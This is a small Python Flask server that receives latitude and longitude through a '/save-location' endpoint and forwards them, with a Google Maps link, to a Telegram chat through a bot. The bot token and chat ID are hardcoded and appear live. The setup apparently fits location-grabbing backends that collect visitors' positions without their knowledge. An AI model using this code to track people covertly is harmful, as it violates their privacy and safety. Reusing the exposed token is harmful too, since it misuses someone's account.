from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = "8677643454:AAFl0hpdVeTAVKcJrOZTeu64VKSQTk6xoQY"
CHAT_ID = "7714751615"

@app.route('/')
def home():
    return "Bot attivo ✅"

@app.route('/save-location', methods=['POST'])
def save_location():
    data = request.json
    lat = data.get('lat')
    lon = data.get('lon')

    maps_link = f"https://www.google.com/maps?q={lat},{lon}"

    message = f"📍 Nuova posizione!\n\nLat: {lat}\nLon: {lon}\n\nApri mappa:\n{maps_link}"

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    requests.post(url, json={
        "chat_id": CHAT_ID,
        "text": message
    })

    return {"status": "ok"}

import os

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)